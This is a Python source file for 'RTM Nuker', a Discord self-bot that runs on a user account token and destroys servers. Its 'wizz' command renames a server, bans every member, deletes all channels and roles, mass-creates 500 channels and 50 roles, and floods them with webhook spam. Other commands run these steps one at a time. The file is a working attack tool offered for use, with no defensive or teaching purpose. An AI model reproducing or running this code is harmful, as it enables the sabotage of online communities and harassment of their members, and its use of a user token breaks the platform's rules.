import discord
import requests
import os
import threading
import string
import random
import time
import json
import asyncio
import aiohttp
from threading import Thread
from discord.utils import find, get
from discord.ext import commands
from time import strftime, gmtime
from discord import Webhook, AsyncWebhookAdapter

intents=discord.Intents.all()

with open('config.json') as f:
	config = json.load(f)

token = os.environ.get("TOKEN")
prefix = config.get('prefix')
channel_names = config.get('channel-names')
server_names = config.get('server-names')
role_names = config.get('role-names')
webhook_names = config.get('webhook-names')
spam_messages = config.get('spam-messages')
spam = config.get('spam')

class RTM:

    def Name(guild):
        try:
            headers = {
                'Authorization': f"{token}"
            }
            json = {
                'name': random.choice(server_names),
            }
            r = requests.patch(f'https://discord.com/api/v8/guilds/{guild}', headers=headers, json=json)
            if r.status_code == 204:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Renamed Guild to\x1b[38;5;213m {json['name']}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Couldn't Rename Guild to\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

    def CreateWebhook(channel):
        try:
            headers = {
                'Authorization': f"{token}"
            }
            json = {
                'name': random.choice(webhook_names),
            }
            r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks', headers=headers, json=json)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass

    def SendWebhook(webhook):
        try:
            for i in range(10000):
                payload={
                    "username": random.choice(webhook_names),
                    'content': random.choice(spam_messages)
                }
                requests.post(webhook, json=payload)
        except:
            pass

    def Ban(guild, member):
        try:
            headers = {
                'Authorization': f"{token}",
                'user-agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36"
            }
            json = {
                'delete_message_days': "1",
                'reason': "wizzed"
            }
            r = requests.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{member}', headers=headers, json=json)
            if r.status_code == 204:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Banned\x1b[38;5;213m {member.name}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Couldn't Ban\x1b[38;5;213m {member.name}\x1b[38;5;15")
        except:
            pass

    def CreateChannel(guild):
        try:
            headers = {
                'Authorization': f"{token}"
            }
            json = {
                'name': random.choice(channel_names),
                'type': 0
            }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if r.status_code == 200:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Created\x1b[38;5;213m {json['name']}\x1b[38;5;15")
            elif 'id' in r.text:
                webhook = RTM.CreateWebhook(r.json()['id'])
                Thread(target=RTM.SendWebhook, args=(webhook,)).start()
            else:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Couldn't Create\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

    def DelChannel(guild, channel):
        try:
            headers = {
                'Authorization': f"{token}"
            }
            r = requests.delete(f'https://discord.com/api/v8/channels/{channel}', headers=headers)
            if r.status_code == 204:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Deleted\x1b[38;5;213m {channel.name}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Couldn't Delete\x1b[38;5;213m {channel.name}\x1b[38;5;15")
        except:
            pass

    def CreateRole(guild):
        try:
            headers = {
                'Authorization': f"{token}"
            }
            json = {
                'name': random.choice(role_names)
            }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if r.status_code == 200:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Created\x1b[38;5;213m {json['name']}\x1b[38;5;15")
            elif 'id' in r.text:
                pass
            else:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Couldn't Create\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

    def DelRole(guild, role):
        try:
            headers = {
                'Authorization': f"{token}"
            }
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{role}', headers=headers)
            if r.status_code == 204:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Deleted\x1b[38;5;213m {role.name}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\x1b[38;5;15mRTM\x1b[38;5;213m]\x1b[38;5;15m Couldn't Delete\x1b[38;5;213m {role.name}\x1b[38;5;15")
        except:
            pass

client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True,intents=intents)
client.remove_command("help")
    
@client.event
async def on_connect():
    os.system(f'cls & title [RTM Nuker] - Connected To {client.user}')
    print('''no design
    ''')

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f'\033[37m[\033[91m{strftime("%H:%M:%S", gmtime())}\033[37m] Command Not Found \033[91m|\033[37m {ctx.message.content}')
    pass

@client.command()
async def help(ctx):
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m help')
    await ctx.message.delete()
    embed = discord.Embed(color=0x2f3136, description=f'''```
• help            | Shows This Message
• wizz            | Wizzes The Server
• ban             | Bans Everyone In The Server
• del-chan        | Deletes All The Channels
• del-roles       | Deletes All The Roles
• mass-chan       | Mass Creates Channels
• mass-roles      | Mass Creates Roles
• purge           | Deletes Your Messages
```''')
    embed.set_footer(text='discord.gg/rtm', icon_url='https://cdn.discordapp.com/icons/785233725755359272/a_67ce529dc6bb7774652ff3b66870e48c.gif?width=102&height=102')
    embed.set_author(name="RTM Nuker")
    await ctx.send(embed=embed)

@client.command()
async def purge(ctx, amount: int):
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m purge')
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass

@client.command()
async def wizz(ctx):
    await ctx.message.delete()
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m wizz')
    RTM.Name(ctx.guild.id)
    for member in ctx.guild.members:
        Thread(target=RTM.Ban, args=(ctx.guild.id, member.id,)).start()
    for channel in ctx.guild.channels:
        Thread(target=RTM.DelChannel, args=(ctx.guild.id, channel.id,)).start()
    for role in ctx.guild.roles:
        Thread(target=RTM.DelRole, args=(ctx.guild.id, role.id,)).start()
    for i in range(50):
        Thread(target=RTM.CreateRole, args=(ctx.guild.id,)).start()
    for i in range(500):
        Thread(target=RTM.CreateChannel, args=(ctx.guild.id,)).start()

@client.command()
async def w(ctx):
    await ctx.message.delete()
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m ban')
    num = 0
    members_1 = []
    members_2 = []
    members_3 = []
    total = len(ctx.guild.members)
    members_per_arrary = round(total/3)
    for member in ctx.guild.members:
        if len(members_1) != members_per_arrary:
            members_1.append(member.id)
        else:
            if len(members_2) != members_per_arrary:
                members_2.append(member.id)
            else:
                if len(members_3) != members_per_arrary:
                    members_3.append(member.id)
                else:
                    pass
    while True:
        try:
            if threading.active_count() <= 500:
                Thread(target=RTM.Ban, args=(ctx.guild.id, members_1[num],)).start()
                Thread(target=RTM.Ban, args=(ctx.guild.id, members_2[num],)).start()
                Thread(target=RTM.Ban, args=(ctx.guild.id, members_3[num],)).start()
                num += 1
        except IndexError:
            break
        except:
            pass

@client.command(name='del-chan')
async def channel(ctx):
    await ctx.message.delete()
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m del-chan')
    for channel in ctx.guild.channels:
        Thread(target=RTM.DelChannel, args=(ctx.guild.id, channel.id,)).start()

@client.command(name='del-roles')
async def roledel(ctx):
    await ctx.message.delete()
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m del-roles')
    for role in ctx.guild.roles:
        Thread(target=RTM.DelRole, args=(ctx.guild.id, role.id,)).start()

@client.command(name='mass-chan')
async def chancreate(ctx):
    await ctx.message.delete()
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m mass-chan')
    for i in range(500):
        Thread(target=RTM.CreateChannel, args=(ctx.guild.id,)).start()

@client.command(name='mass-roles')
async def rolecreate(ctx):
    await ctx.message.delete()
    print(f'[\x1b[38;5;213m{strftime("%H:%M:%S", gmtime())}\x1b[38;5;15m] Command Used \x1b[38;5;213m|\x1b[38;5;15m create-roles')
    for i in range(500):
        Thread(target=RTM.CreateRole, args=(ctx.guild.id,)).start()  

client.run(token, bot=False)
